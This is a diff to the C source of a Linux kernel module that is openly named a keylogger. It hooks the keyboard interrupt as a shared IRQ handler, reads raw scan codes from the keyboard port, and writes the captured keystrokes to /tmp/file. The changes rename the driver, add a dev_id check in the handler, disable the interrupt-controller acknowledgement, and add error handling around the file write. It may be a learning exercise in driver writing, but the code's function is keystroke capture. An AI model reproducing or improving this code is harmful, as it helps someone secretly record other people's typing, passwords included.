@@ -1,6 +1,6 @@
 #include "keyboard.h"
 
-static char *id = "keyboard";
+static char *id = "ariard-keyboard";
 
 static unsigned int scan_array[SIZE];
 
@@ -158,7 +158,13 @@ DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);
 irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 {
 	unsigned int scan_code = 0;
+	unsigned int status = 0;
 
+	/* return if not mine, as LDD Chap 10 Installing a Shared Handler advices */
+	status = inb(0x64);
+	/* printk(BYTE_TO_BINARY_PATTERN, BYTE_TO_BINARY(status)); */
+	if (strcmp((char *)dev_id, id))
+		return IRQ_NONE;
 	scan_code = inb(KEYBOARD_PORT);
 	if (scan_code) {
 		if (windex + 1 >= SIZE)
@@ -168,7 +174,7 @@ irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 		write_unlock(&keyboard_rwlock);
 		tasklet_schedule(&keyboard_tasklet);
 	}
-	outb(PIC1_PORT, PIC_EOI);
+	/* outb(PIC1_PORT, PIC_EOI); ? */
 	return IRQ_HANDLED;
 }
 
@@ -185,10 +191,9 @@ static int __init keylogger_init(void)
 		printk(KERN_INFO "misc keylogger : register successful\n");
 	}
 
-	result = request_irq(KEYBOARD_IRQ, keyboard_interrupt, IRQF_SHARED, "keyboard-driver", id);
+	result = request_irq(KEYBOARD_IRQ, keyboard_interrupt, IRQF_SHARED, "keylogger", id);
 	if (result) {
 		printk(KERN_INFO "driver keylogger : IRQ register failed");
-		
 		goto err;
 	}
 	
@@ -247,8 +252,8 @@ static void		ks_list_flush(void)
 	set_fs(KERNEL_DS);
 
 	if ((file = filp_open("/tmp/file", O_WRONLY | O_CREAT | O_TRUNC, 0644))) {
-		kernel_write(file, buf, strlen(buf), &off);
-		fput(file);
+		if (kernel_write(file, buf, strlen(buf), &off) < 0 || fput(file) < 0)
+			printk("keylogger : error write into /tmp/file");
 	}
 	filp_close(file, 0);
 	set_fs(old_fs);
